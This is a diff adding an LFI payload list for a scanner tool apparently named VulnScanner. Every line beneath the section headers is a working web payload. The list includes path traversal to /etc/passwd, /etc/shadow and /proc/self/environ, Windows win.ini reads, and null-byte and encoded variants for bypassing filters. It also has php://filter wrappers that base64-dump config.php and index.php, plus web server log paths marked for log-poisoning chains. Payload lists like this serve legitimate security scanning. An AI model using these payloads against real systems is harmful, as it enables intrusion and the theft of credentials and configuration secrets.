@@ -1,0 +1,66 @@
+# LFI Payloads — VulnScanner reference list
+# Usage: python main.py -u "..." --scan-type lfi --payloads payloads/lfi.txt
+#
+# Format: one payload per line.  Lines starting with # are ignored.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ── Unix — basic path traversal ───────────────────────────────────────────
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+
+# ── Unix — absolute paths ────────────────────────────────────────────────
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/os-release
+/proc/self/environ
+/proc/version
+/proc/self/cmdline
+/var/www/html/index.php
+/var/www/html/config.php
+
+# ── Windows path traversal ───────────────────────────────────────────────
+..\..\..\..\windows\win.ini
+..\..\..\windows\win.ini
+C:\windows\win.ini
+C:/windows/win.ini
+C:\windows\system.ini
+C:/windows/system32/drivers/etc/hosts
+
+# ── Null byte injection (PHP < 5.3.4) ────────────────────────────────────
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.php
+../../../etc/passwd\x00
+
+# ── URL-encoded traversal ────────────────────────────────────────────────
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+
+# ── Double slash / dot bypass ────────────────────────────────────────────
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+....\\....\\....\\etc\\passwd
+/./././././etc/passwd
+
+# ── PHP stream wrappers ───────────────────────────────────────────────────
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../index.php
+php://filter/convert.base64-encode/resource=../../index.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config.php
+
+# ── Log poisoning targets (chain with header injection) ───────────────────
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/proc/self/fd/1
+/proc/self/fd/2
